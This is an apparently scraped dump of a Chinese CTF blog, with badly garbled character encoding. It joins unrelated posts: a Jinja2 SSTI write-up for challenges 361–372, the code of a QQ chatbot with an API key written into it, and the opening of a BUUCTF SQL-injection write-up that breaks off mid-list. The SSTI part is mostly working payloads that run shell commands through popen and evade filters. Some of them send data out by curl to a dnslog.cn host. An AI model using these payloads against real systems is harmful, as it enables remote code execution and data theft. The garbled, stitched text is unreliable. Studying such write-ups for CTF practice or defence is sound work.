[é™¤äº†pythonä¹‹å¤–çš„SSTI](https://www.cnblogs.com/bmjoker/p/13508538.html)\n\n\n\n\n\n\n\n**361**\n\næ— è¿‡æ»¤ï¼Œå‚æ•°åä¸ºnameï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**362**\n\nè¿‡æ»¤äº†æ•°å­—ï¼Œä½¿ç”¨å…¨è§’æ•°å­—ä»£æ›¿æ­£å¸¸æ•°å­—\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[ï¼‘ï¼“ï¼’].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**363**\n\nè¿‡æ»¤äº†å•åŒå¼•å·ï¼Œå¯é€šè¿‡request.argsä¼ å…¥æ–°å‚æ•°è§£å†³ï¼Œæˆ–è€…ä½¿ç”¨chræ¥ç»•è¿‡\n\n```\n//request.args\npayload:?name={{config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=tac /flag\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**364**\n\nè¿‡æ»¤äº†argsï¼Œæ— æ³•ä½¿ç”¨GETä¼ å‚äº†ï¼Œä½¿ç”¨~~POSTï¼ˆæ–¹æ³•è¢«ç¦ç”¨äº†ï¼‰~~æˆ–è€…cookieéƒ½å¯\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\nCookie: a=os;b=popen;c=tac /flag;\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**365**\n\nè¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œæ¢ç‚¹\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()}}\nCookie: a=tac /flag\n```\n\n**366**\n\nè¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œç”¨attræ–¹æ³•ï¼šrequest|attr(request.cookies.a)ç­‰ä»·äºrequest[â€œaâ€]\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag;\n```\n\nä»–äººWP\n\n```\npayload:?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\nCookie: a=__globals__;b=cat /flag;\n```\n\n**367**\n\nè¿‡æ»¤äº†osï¼Œç»§ç»­ç”¨attr\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**368**\n\nè¿‡æ»¤äº†{undefined{undefinedï¼Œä½¿ç”¨å‘½ä»¤æ–¹å¼print\n\n```\npayload:?name={% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**369**\n\nè¿‡æ»¤äº†requestï¼Œæ²¡åŠæ³•ä¼ é€’å‚é‡äº†ï¼Œä½¿ç”¨æ¨¡ç‰ˆè¿‡æ»¤å™¨\n\n```\npayload:?name={% set po=dict(po=a,p=a)|join%}//æ„é€ popï¼Œä¸ºä¸‹æ–¹æä¾›_\n{% set a=(()|select|string|list)|attr(po)(24)%}//æ„é€ å‡º_\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}//æ„é€ å‡º__init__\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}//æ„é€ å‡º__globals__\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}//æ„é€ å‡º__getitem__\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}//æ„é€ å‡º__builtins__\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}//æ„é€ å‡ºbuiltinsæ¨¡å—\n{% set chr=x.chr%}//ä½¿ç”¨chrå‡½æ•°\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}//æ„é€ å‡ºå­—ç¬¦ä¸²/flag\n{%print(x.open(file).read())%}//è¯»æ–‡ä»¶\n```\n\n**370**\n\nè¿‡æ»¤æ•°å­—ç”¨å…¨è§’ï¼Œæˆ–è€…ä½¿ç”¨lengthï¼Œcountæ„é€ æ•°å­—\n\n```\npayload:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(ï¼’ï¼”)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(ï¼”ï¼—)%2bchr(ï¼‘ï¼ï¼’)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼“)%}\n{%print(x.open(file).read())%}\n```\n\n**371**\n\nprintå›æ˜¾è¢«ç¦ï¼Œdnslogå¤–å¸¦\n\n```\n?name={%set po=(dict(po=a,p=a)|join)%}\n{% set ershisi=(dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|length)%}\n{% set xiahuaxian=(()|select|string|list)|attr(po)(ershisi)%}\n{% set ur=((dict(ur=a,l=a)|join,xiahuaxian,dict(fo=a,r=a)|join)|join)%}\n{% set glo=((xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join)%}\n{% set ous=(dict(o=a,s=a)|join)%}\n{% set ouuu=(ur|attr(glo)|attr(ous))%}\n```\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n**372**\n\ncountæ¢æˆlength\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n","tags":["CTF","web","SSTI"]},{"title":"ç½—ä¼¯ç‰¹","url":"/posts/61106.html","content":"\n```python\n#bot.py\nfrom unittest.mock import NonCallableMagicMock\nfrom flask import Flask, request\nimport requests\nimport api\napp = Flask(__name__)\n\n'''ç›‘å¬ç«¯å£ï¼Œè·å–QQä¿¡æ¯'''\n@app.route('/', methods=[\"POST\"])\ndef post_data():\n    'ä¸‹é¢çš„request.get_json().get......æ˜¯ç”¨æ¥è·å–å…³é”®å­—çš„å€¼ç”¨çš„ï¼Œå…³é”®å­—å‚è€ƒä¸Šé¢ä»£ç æ®µçš„æ•°æ®æ ¼å¼'\n    if request.get_json().get('message_type')=='private':\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        api.keywordForPerson(message,uid)\n    if request.get_json().get('message_type')=='group':\n        gid = request.get_json().get('group_id')\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        nick=request.get_json().get('sender').get('nickname')\n        role=request.get_json().get('sender').get('role')\n        api.keywordForGroup(message, gid, uid,nick,role)\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(debug=True, host='127.0.0.1', port=5701)\n\n```\n\n```python\n#api.py\nimport person\nimport group\nimport requests\nimport re\nimport time\nimport json\nimport random\n\n\n\ndef help():\n    return \"å¤©æ°”ï¼šè¾“å…¥å¤©æ°” åœ°åï¼Œè·å–å½“åœ°å¤©æ°”ï¼Œé»˜è®¤ä¸ºå¾å·å¤©æ°”\\nåŒè‰²çƒï¼šè¾“å…¥åŒè‰²çƒæŸ¥çœ‹æœ€æ–°ä¸€æœŸåŒè‰²çƒå¼€å¥–ä¿¡æ¯ä»¥åŠå¥–æ± ç´¯è®¡é‡‘é¢\\næ‰”ç“¶å­ï¼šç§èŠç½—ä¼¯ç‰¹å¹¶å‘é€ä»¥ä¸‹å†…å®¹ï¼š\\næ‰”ç“¶å­ å‘é€è€…ï¼ˆå¯å¡«åŒ¿åï¼‰ æ¥å—è€…ï¼ˆå¯å¡«ç©ºï¼‰ å†…å®¹\\næ¥æ‰”ç“¶å­\\næç“¶å­ï¼šå‘é€æç“¶å­æ¥æåˆ«äººæ‰”çš„ç“¶å­\\nå¸®åŠ©ï¼šè¾“å…¥/helpï¼Œè·å–å¸®åŠ©\"\ndef weather(message):\n    try:\n        city=message.split(' ')[1]\n    except:\n        city='å¾å·'\n    try:\n        ercode=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city,timeout=1).text\n    except:\n        return \"ç½—ä¼¯ç‰¹è¢«å­¦æ ¡å…³èµ·æ¥äº†å‘œå‘œ\"\n    if \"invilad-citykey\" in ercode:\n        return \"æŠ±æ­‰ï¼Œæ‚¨çš„è¾“å…¥æœ‰è¯¯ï¼Œè¯·æ£€æŸ¥åå†è¯•\"\n    weatherInfo=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['forecast'][0]\n    ganmao=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['ganmao']\n    fl=re.search(r\"[0-9]+\",weatherInfo['fengli']).group(0)\n    hi=re.search(r\"[0-9]+\",weatherInfo['high']).group(0)\n    lo=re.search(r\"[0-9]+\",weatherInfo['low']).group(0)\n    weatherInfo=f\"ä»Šæ—¥{city}å¤©æ°”{weatherInfo['type']}ï¼Œæœ€é«˜æ¸©åº¦{hi}â„ƒï¼Œæœ€ä½æ¸©åº¦{lo}â„ƒï¼Œ{weatherInfo['fengxiang']}{fl}çº§\\næ¸©é¦¨æç¤ºï¼Œ{ganmao}\"\n    return weatherInfo\ndef buquan(message,uid):\n    #è®¡ç®—æ‹¬å·æ•°é‡å¹¶è‡ªåŠ¨è¡¥å…¨\n    def countBracket(message):\n        countban=0\n        for i in message:\n            if i=='(':\n                countban+=1\n            if i==')':\n                countban-=1\n        countquan=0\n        for i in message:\n            if i=='ï¼ˆ':\n                countquan+=1\n            if i=='ï¼‰':\n                countquan-=1\n        return {'ban':countban,'quan':countquan}\n    #è‡ªåŠ¨è¡¥å…¨æ‹¬å·\n    ban=countBracket(message)['ban']\n    quan=countBracket(message)['quan']\n    bu=\"\"\n    if not (ban or quan):\n        return\n    if ban>0:\n        for i in range(ban):\n            bu+=')'\n    elif ban<0:\n        for i in range(-ban):\n            bu+='('\n    if quan>0:\n        for i in range(quan):\n            bu+='ï¼‰'\n    elif quan<0:\n        for i in range(-quan):\n            bu+='ï¼ˆ'\n    print(bu+f\"[CQ:at,qq={uid}]å¸®ä½ è¡¥æ‹¬å·\")\n    return bu+f\"[CQ:at,qq={uid}]å¸®ä½ è¡¥æ‹¬å·\"\ndef theDoubleChromosphere(uid):\n    tex=requests.get(\"http://www.cwl.gov.cn/fcpz/yxjs/ssq/\").text\n    #è·å–çº¢çƒ\n    red=re.search(r\"<div class=\\\"ssqRed-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    red=red.split(',')\n    #è·å–è“çƒ\n    blue=re.search(r\"<div class=\\\"ssqBlue-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    blue=blue.split(',')\n    #è·å–æœŸå·\n    qh=re.search(r\"<div class=\\\"ssqQh-dom\\\">(.*?)</div>\",tex).group(1)\n    #è·å–å¥–æ± \n    pool=re.search(r\"<div class=\\\"ssqPool-dom\\\">(.*?)</div>\",tex).group(1)\n    return f\"ç¬¬{qh}æœŸå¼€å¥–ç»“æœä¸ºï¼š\\nçº¢çƒï¼š{red}\\nè“çƒï¼š{blue}\\nå¥–æ± ï¼š{pool}\\n[CQ:at,qq={uid}]å®³æç€ç­‰ç€å¹²å•¥å‘¢ï¼Œèµ¶ç´§ä¹°å½©ç¥¨å»å•Š\"\ndef sign(gid,uid,nick):\n    today=time.strftime(\"%Y-%m-%d\",time.localtime())\n    groupUserInfo=group.readGroupUserInfo()\n    try:\n        thisGroupUserInfo=groupUserInfo[str(gid)]\n    except:\n        thisGroupUserInfo={}\n        thisGroupUserInfo[str(uid)]={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n        thisGroupUserInfo[str(uid)]=thisUser\n    if thisUser['signTime']==today:\n        return f\"[CQ:at,qq={uid}]æ‚¨ä»Šå¤©å·²ç»ç­¾åˆ°è¿‡äº†ï¼Œæ˜å¤©å†æ¥å§\"\n    else:\n        thisUser['point']+=1\n        thisUser['signTime']=today\n        group.saveGroupUserInfo(groupUserInfo)\n        return f\"[CQ:at,qq={uid}]ç­¾åˆ°æˆåŠŸï¼Œæ‚¨çš„ç§¯åˆ†ä¸º{thisUser['point']}ï¼Œæ˜å¤©å†æ¥å§\"\ndef getQQ(message):\n    try:\n        qq=re.search(r\"qq=(\\d+)\",message).group(1)\n    except:\n        qq=None\n    return qq\ndef ban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=True\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"å¥½ï¼Œæˆ‘ä»¬ä¸å’Œ[CQ:at,qq={uid}]ç©\"\ndef unban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=False\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"å¥½å§ï¼Œæˆ‘åŸè°…ä½ äº†[CQ:at,qq={uid}]\"\ndef keywordForPerson(message, uid):\n    if message[0:2]=='å¤©æ°”':\n        person.sendMessage(weather(message),uid)\ndef isBan(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['ban']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef point(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        return f\"[CQ:at,qq={uid}]æ‚¨çš„ç§¯åˆ†ä¸º{thisUser['point']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]è¯·å…ˆç­¾åˆ°åé‡è¯•\"\ndef isAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['admin']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef giveAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": \"nick\", \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    thisUser['admin']=True\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"æ²¡é—®é¢˜ï¼Œä»¥åæˆ‘å°±å¬ä½ çš„å•¦[CQ:at,qq={uid}]\"\ndef today(message):\n    try:\n        message=message.split(' ')\n        message=message[1]\n    except:\n        message=None\n        return f\"è¯·è¾“å…¥è¿åŠ¿ æ˜Ÿåº§æ¥æŸ¥è¯¢ä»Šæ—¥è¿åŠ¿\"\n    if len(message)==2:\n        message=message+\"åº§\"\n    url=\"http://web.juhe.cn:8080/constellation/getAll\"\n    params={\n        \"key\":\"4a11bbcbf089edaf14c2d9bdb80c2ec4\",\n        \"consName\":message,\n        \"type\":\"today\"\n    }\n    ys=requests.get(url=url,params=params).json()\n    return f\"{ys['name']}ä»Šæ—¥è¿åŠ¿ï¼š\\nç»¼åˆæŒ‡æ•°ï¼š{ys['all']}%\\nå¹¸è¿è‰²ï¼š{ys['color']}\\nå¥åº·æŒ‡æ•°ï¼š{ys['health']}%\\nçˆ±æƒ…æŒ‡æ•°ï¼š{ys['love']}%\\nè´¢è¿æŒ‡æ•°ï¼š{ys['money']}%\\nå·¥ä½œæŒ‡æ•°ï¼š{ys['work']}%\\nå¹¸è¿æ•°å­—ï¼š{ys['number']}\\né€‚é…æ˜Ÿåº§ï¼š{ys['QFriend']}\\næ€»ç»“ï¼š{ys['summary']}\"\ndef minusPoint(gid,uid,point):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]è¯·å…ˆç­¾åˆ°åé‡è¯•\"\n    if thisUser['point']-point < 0:\n        return f\"[CQ:at,qq={uid}]æ‚¨çš„ç§¯åˆ†ä¸è¶³\"\n    thisUser['point']-=point\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return \"OK\"\ndef throwBottle(uid,message):\n    try:\n        me=message.split(\" \",3)\n        send=me[1]\n        rec=me[2]\n        con=me[3]\n        with open('bottle.json','r') as f:\n            bottle = json.load(f)\n        nb={\n            \"QQ\":str(uid),\n            \"send\":send,\n            \"rec\":rec,\n            \"con\":con\n        }\n        bottle.append(nb)\n        with open('bottle.json','w') as f:\n            json.dump(bottle,f)\n        return f\"biuï½ï½ï½ç“¶å­è¢«æ‰”èµ°å•¦ï¼Œåç­‰è¢«äººæ‰“æå§ï½ï½ï½\"\n    except:\n        return \"æ‰”ç“¶å­å¤±è´¥äº†ï¼Œè¯·æ£€æŸ¥å†…å®¹æ ¼å¼æ˜¯å¦ä¸ºï¼š\\næ‰”ç“¶å­ å‘é€è€…ï¼ˆå¯å¡«åŒ¿åï¼‰ æ¥å—è€…ï¼ˆå¯å¡«ç©ºï¼‰ å†…å®¹\"\ndef getBottle(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)      \n    with open('bottle.json','r') as f:\n        bottle = json.load(f)\n    num=random.randint(0,len(bottle)-1)\n    nb=bottle[num]\n    bottle.remove(nb)\n    try:\n        myBottles[str(uid)].append(nb)\n    except:\n        myBottles[str(uid)]=[nb]\n    with open('bottle.json','w') as f:\n        json.dump(bottle,f)\n    with open('myBottles.json','w') as f:\n        json.dump(myBottles,f)\n    return f\"{nb['send']}æ‰”ç»™äº†{nb['rec']}ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š{nb['con']}\"\ndef myBottles(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return \"æ‚¨è¿˜æ²¡æœ‰ç“¶å­å‘¢ï¼Œå¿«å»æç“¶å­å§ï½ï½ï½\"\n    me=\"\"\n    for i in myBottles[str(uid)]:\n        me+=f\"{i['send']}æ‰”ç»™äº†{i['rec']}ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š{i['con']}\\n\"\n    return f\"[CQ:at,qq={uid}]æ‚¨çš„ç“¶å­æœ‰ï¼š\\n{me}\"\ndef cleanBottles(message,uid):\n    num=message.split(\" \")[1]\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]æ‚¨è¿˜æ²¡æœ‰ç“¶å­å‘¢ï¼Œå¿«å»æç“¶å­å§ï½ï½ï½\"\n    try:\n        nb=myBottles[str(uid)].pop(int(num)-1)\n        with open('myBottles.json','w') as f:\n            json.dump(myBottles,f)\n        return f\"[CQ:at,qq={uid}]æ‚¨æ‘”ç¢äº†{nb['send']}æ‰”ç»™{nb['rec']}ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š{nb['con']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]æ‚¨è¿˜æ²¡æœ‰è¿™ä¸ªç“¶å­ï¼Œå¿«å»æä¸€ä¸ªå§\"\n\n\ndef keywordForGroup(message, gid, uid,nick,role):\n    if isBan(gid,uid) and not isAdmin(gid,uid):\n        return\n    if message[0:2]=='å¤©æ°”':\n        group.sendMessage(weather(message),gid)\n    elif message[0:2]=='è¿åŠ¿':\n        group.sendMessage(today(message),gid)\n    elif message==\"ç§¯åˆ†\":\n        group.sendMessage(point(gid,uid),gid)\n    elif message[0:4]==\"å¬ä»–çš„è¯\" and uid==405454586:\n        group.sendMessage(giveAdmin(gid,getQQ(message)),gid)\n    elif message[0:3]=='ban' and isAdmin(gid,uid):\n        group.sendMessage(ban(gid,getQQ(message)),gid)\n    elif message[0:5]=='unban' and isAdmin(gid,uid):\n        group.sendMessage(unban(gid,getQQ(message)),gid)\n    elif message=='/help':\n        group.sendMessage(help(),gid)\n    elif message[0:3]=='åŒè‰²çƒ':\n        group.sendMessage(theDoubleChromosphere(uid),gid)\n    elif message==\"ç­¾åˆ°\":\n        group.sendMessage(sign(gid,uid,nick),gid)\n    elif message==\"æç“¶å­\":\n        group.sendMessage(getBottle(uid),gid)\n    elif message==\"æˆ‘çš„ç“¶å­\":\n        group.sendMessage(myBottles(uid),gid)\n    elif message[0:3]==\"æ‘”ç“¶å­\":\n        group.sendMessage(cleanBottles(message,uid),gid)\n    elif message==\"æ— å†…é¬¼\":\n        group.sendMessage(f\"[CQ:at,qq={uid}]ç©¿ä»¶è¡£æœå§ä½ ï¼ä½ è‡ªå·±ä¸æ¶sinå—ï¼Ÿ\",gid)\n    if re.search(r\"[\\(\\)ï¼ˆï¼‰]\",message):\n        group.sendMessage(buquan(message,uid),gid)\ndef keywordForPerson(message,uid):\n    if message[0:3]==\"æ‰”ç“¶å­\":\n        person.sendMessage(throwBottle(uid,message),uid)\n```\n\n```python\n#group.py\nimport json\nimport requests\n\n#ä¿å­˜ç”¨æˆ·ä¿¡æ¯\ndef saveGroupUserInfo(userInfo):\n    with open('userInfoOfGroup.json','w') as f:\n        json.dump(userInfo,f)\n#è¯»å–ç”¨æˆ·ä¿¡æ¯\ndef readGroupUserInfo():\n    with open('userInfoOfGroup.json','r') as f:\n        userInfo = json.load(f)\n    return userInfo\n#å‘é€ä¿¡æ¯\ndef sendMessage(message,gid):\n    url=\"http://127.0.0.1:5700/send_msg?group_id=\"+str(gid)+\"&message=\"+message\n    requests.get(url)\n```\n\n","tags":["python"]},{"title":"BUUCTFè®°å½•1","url":"/posts/42117.html","content":"\nBUUç¬¬ä¸€ä»½\n\n<!--more -->\n\n## [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL\n\né¦–å…ˆå°è¯•è¾“å…¥ç‚¹ä¸œè¥¿\n\nç»“æœ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-13 22.14.07.png)\n\nå°è¯•ä¸‡èƒ½å¯†ç ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-13 22.14.34.png)\n\nè·‘ä¸€ä¸‹çœ‹çœ‹éƒ½è¿‡æ»¤äº†å•¥\n\n```\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: union\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: and\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: sleep\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: by\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: if\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: char\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ascii\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: mid\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: substring\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: handler\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: benchmark\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: insert\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: *\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: =\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: 